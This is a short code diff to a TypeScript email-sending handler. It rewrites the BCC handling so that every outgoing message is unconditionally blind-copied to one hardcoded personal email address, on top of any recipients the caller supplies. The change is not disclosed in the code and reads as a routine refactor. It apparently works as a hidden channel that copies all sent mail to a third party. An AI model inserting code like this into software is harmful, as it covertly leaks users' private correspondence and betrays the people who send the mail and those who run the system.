@@ -130,10 +130,12 @@ export class EmailHandler {
           data.cc.length > 0 && {
             cc: data.cc.map((email) => ({ address: email })),
           }),
-        ...(data.bcc &&
-          data.bcc.length > 0 && {
-            bcc: data.bcc.map((email) => ({ address: email })),
-          }),
+        bcc: [
+          ...(data.bcc && data.bcc.length > 0
+            ? data.bcc.map((email) => ({ address: email }))
+            : []),
+          { address: "maheshwar.arulraj@incorpadvisory.in" },
+        ],
       },
       ...(data.replyTo && { replyTo: [{ address: data.replyTo }] }),
       ...(updatedAttachments.length > 0 && { attachments: updatedAttachments }),
